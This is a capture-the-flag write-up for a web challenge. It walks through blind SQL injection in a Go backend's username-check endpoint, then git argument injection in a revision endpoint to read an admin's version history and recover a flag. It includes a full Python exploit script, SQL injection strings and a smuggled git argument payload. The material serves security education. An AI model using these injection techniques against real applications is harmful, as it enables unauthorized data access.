# Scratchpad

## Description

My new note-taking app is great for jotting down quick thoughts (or flags)!

## Files

* [scratchpad.zip](scratchpad.zip)

## Writeup

This challenge gives us a zip file, so the best thing we can do to start is to extract it!

When we do, we see the source code for a website with a frontend in Vite and a backend using Go.

Looking at `entrypoint.sh`,. we can also see where our flag will be:
```bash
#!/bin/sh
set -e
  
DB_PATH="/app/ctf.db"
USERS_DIR="/app/data"
FLAG=$(cat /flag.txt)
FOLDER=$(uuidgen)
FOLDER_PATH="$USERS_DIR/$FOLDER"
  
echo $FOLDER
  
mkdir -p "$FOLDER_PATH"
  
cd "$FOLDER_PATH"
git init
echo "$FLAG" > scratchpad.txt
git add scratchpad.txt
git commit -m "Add flag"
echo "" > scratchpad.txt
git add scratchpad.txt
git commit -m "Blank file"
cd -
  
sqlite3 "$DB_PATH" <<EOF
CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password TEXT, folder TEXT, filename TEXT);
INSERT INTO users (username, password, folder, filename) VALUES ('admin', 'temppassword', '$FOLDER','scratchpad.txt');
EOF
  
rm /flag.txt
  
/usr/bin/supervisord -c /etc/supervisord.conf
```

Interestingly, it seems the file is hidden in a random folder using `git` version control. The file also does not currently display the flag since it was rewritten as a blank file, but the version history of the file would still display the flag.

Seeing a SQL database containing our folder location, an interesting part of the Go source code starts to stand out.
```go
func usernameCheckHandler(w http.ResponseWriter, r *http.Request) {
    username := strings.ToLower(r.URL.Query().Get("username"))
    row := db.QueryRow(fmt.Sprintf("SELECT 1 FROM users WHERE username = '%s'", username))
    var dummy int
    err := row.Scan(&dummy)
    json.NewEncoder(w).Encode(map[string]bool{"good": err == sql.ErrNoRows})
}
```

This function is linked to the endpoint `/api/username_check` and takes a query string parameter, `username`. However, it directly passes the input into a SQL query with no sanitation, which is very bad. This is a clear example of an SQL injection vulnerability. And ultimately, since the function tells us whether or not there is a row in the output (saying "good" is "true" if there are no rows and "false" if there is a row), we can use standard blind SQL injection.

Now, we just need to figure out what to do with that. The endpoint `/api/revision/` maps to an interesting function that once again fails to properly sanitize user input.
```go
func handleRevision(w http.ResponseWriter, r *http.Request) {
    var req RevisionRequest
  
    claims, err := getClaims(r)
    if err != nil {
        http.Error(w, "Unauthorized", 401)
        return
    }
    folder := claims["folder"].(string)
  
    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        http.Error(w, "bad request", 400)
        return
    }
  
    args := strings.Split(req.Action, " ")
    args = append(args, fmt.Sprintf("%s:scratchpad.txt", req.Hash))
    cmd := exec.Command("git", args...)
    cmd.Dir = filepath.Join("data", folder)
  
    out, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, string(out), 500)
        return
    }
    w.Write(out)
}
```

Unfortunately, we can't execute arbitrary Bash code here, but we can control a lot with the `git` command. This is the same command we can use to view the version history of the file the flag is in. The only challenges, though, are that the revision hash is included in the format string `%s:scratchpad.txt` at the end of the request, which we don't really want, and this is all done without our user's folder, not the admin folder we want to read the flag from. However, this full command should do the trick:

```bash
git -C ../thefolder log -- scratchpad.txt -- hash:scratchpad.txt
```

The `-C` option enables us to run `git` from another directory other than the current working directory, which we can use to get into the admin folder. The `--` argument tells `git` to process the files, `scratchpad.txt` and `hash:scratchpad.txt` as literal files rather than specific hashes for revisions. The latter of these is simply ignored since it is not a real file.

So our payload `action` is `-C ../thefolder log -- scratchpad.txt --` and our `hash` can be anything. We can use the same Python script we write to perform the SQL injection to give us the payload we'll need.

```python
# Necessary to perform the HTTP requests required to exploit
from requests import get, post
# Necessary to URL encode the SQL injection payload
from urllib.parse import quote_plus as urlencode
# Helps craft the payload to exploit git
from json import dumps
# Stores the necessary character set
import string

# Our host to exploit here
host = "https://jfoubfoe.web.ctf.uscybergames.com/"

# Generates a SQL injection payload for the host
def gen_payload(payload):
    return host + "api/username_check?username=" + urlencode("admin' and " + payload + " and '1'='1")

# Generates a specific payload to compare a character of the folder with a guess character
def gen_substr(idx, char):
    return gen_payload("substr(folder, " + str(idx) + ", 1) = '" + char + "'")

# Performs a GET request with the substring payload
def run_substr(idx, char):
    return get(gen_substr(idx, char)).json()

# Our charset (since it is a UUID)
charset = string.hexdigits + "-"

# Checks an individual index of the folder 
def check_idx(idx):
    # Loop through our charset for each possible guess
    for char in charset:
        # Perform the GET request
        res = run_substr(idx, char)
        # If "good" is "false", it means there is a row and the character matches
        if not res["good"]:
            return char
    # Return an empty string if all characters exhausted (end of folder name)
    return ""

# Stores the folder
folder = ""
# Initialize our guess character
char = "a"
# Start at index 1 (first character in SQL)
i = 1
# Loop while we have a next character
while len(char) > 0:
    # Get the character
    char = check_idx(i)
    # Go to next index after this
    i += 1
    # Add character to known folder name
    folder += char
    # Print progress
    print(folder)

# Action necessary to view the log
action = "-C ../" + folder + " log -- scratchpad.txt --"
# Just a random hash value to complete the request payload
hash_val = "test"
# Create the payload as JSON
body_payload = dumps({"action":action,"hash":hash_val})
# String with fetch payload
full_fetch = "fetch(\"" + host + "api/revision\", {method:\"POST\",body:'"+body_payload+"'});"
# Print the payload so we can run it after logging in
print(full_fetch)

```


Now we can run this!

![SQLi](../../images/Pasted%20image%2020250616205151.png)

After logging in, it ultimately becomes easier to just copy the request from reviewing a revision of our own file so we can include the necessary credentials, but we still use the same payload.

![Fetch](../../images/Pasted%20image%2020250616205309.png)

![Revision data](../../images/Pasted%20image%2020250616205330.png)

Now that we have the revision, we can use a similar `git show` payload to show the flag!

![Fetch 2](../../images/Pasted%20image%2020250616205415.png)

![Flag](../../images/Pasted%20image%2020250616205437.png)

And our flag is `SVUSCG{331be1ddccf6667a5271d4727eb36098}`!
